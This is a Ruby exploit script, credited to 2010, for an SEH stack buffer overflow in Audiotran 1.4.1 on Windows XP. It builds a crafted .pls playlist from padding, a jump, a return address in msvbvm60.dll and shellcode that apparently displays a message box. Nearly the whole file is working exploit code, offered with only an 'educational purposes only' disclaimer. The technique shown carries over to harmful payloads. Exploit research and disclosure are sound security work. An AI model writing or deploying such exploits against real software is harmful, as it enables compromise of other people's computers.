#!/usr/bin/ruby
#
# Exploit Title : Audiotran 1.4.1 Win XP SP2/SP3 English Buffer Overflow
# Date          : January 9th, 2010
# Author        : Sébastien Duquette
# Software Link : http://www.e-soft.co.uk/Audiotran.htm
# Version       : 1.4.1
# OS            : Windows
# Tested on     : XP SP2/SP3 En (VMware)
# Type of vuln  : Stack Overflow / SEH
# Greetz to     : Corelan Team::corelanc0d3r/EdiStrosar/Rick2600/MarkoT/mr_me
#
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
#
#
#

banner =
"|------------------------------------------------------------------|\n" +
"|                         __               __                      |\n" +
"|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n" +
"|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n" +
"| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n" +
"| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n" +
"|                                                                  |\n" +
"|                                       http://www.corelan.be:8800 |\n" +
"|                                                                  |\n" +
"|-------------------------------------------------[ EIP Hunters ]--|\n\n"

# Corelan Team MsgBox
payload =
"\xeb\x22\x56\x31\xc0\x64\x8b\x40\x30\x85\xc0\x78" +
"\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\xeb" +
"\x09\x8b\x40\x34\x8d\x40\x7c\x8b\x40\x3c\x5e\xc3" +
"\xeb\x69\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54" +
"\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb" +
"\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0" +
"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb" +
"\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb" +
"\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b" +
"\x01\xe8\x89\x44\x24\x1c\x61\xc3\xad\x50\x52\xe8" +
"\xaa\xff\xff\xff\x89\x07\x44\x44\x44\x44\x44\x44" +
"\x44\x44\x47\x47\x47\x47\x39\xce\x75\xe6\xc3\x4c" +
"\x4c\x4c\x4c\x89\xe5\xe8\x68\xff\xff\xff\x89\xc2" +
"\xeb\x1c\x5e\x8d\x7d\x04\x89\xf1\x80\xc1\x0c\xe8" +
"\xc8\xff\xff\xff\xeb\x15\x31\xd2\x59\x88\x51\x36" +
"\x51\x52\xff\x54\x24\x0c\xe8\xdf\xff\xff\xff\x57" +
"\x7f\x29\x62\xe8\xe6\xff\xff\xff\x43\x6f\x72\x65" +
"\x6c\x61\x6e\x20\x54\x65\x61\x6d\x20\x53\x68\x65" +
"\x6c\x6c\x63\x6f\x64\x65\x20\x2d\x20\x50\x72\x6f" +
"\x67\x72\x61\x6d\x20\x65\x78\x70\x6c\x6f\x69\x74" +
"\x65\x64\x20\x73\x75\x63\x65\x73\x73\x66\x75\x6c" +
"\x6c\x79\x58"

print banner
puts "[+] Exploit for Audiotran 1.4.1."

filename = "audiotran_poc.pls"
f = File.new(filename, 'w')
f.write 'A' * 1308 #padding
f.write "\xeb\x06\x90\x90"
f.write "\xcb\x75\x52\x73" # ret at 0x735275CB [msvbvm60.dll]
f.write payload
f.write 'A' * 9000 # padding
f.close

puts "[+] Wrote exploit file : #{filename}."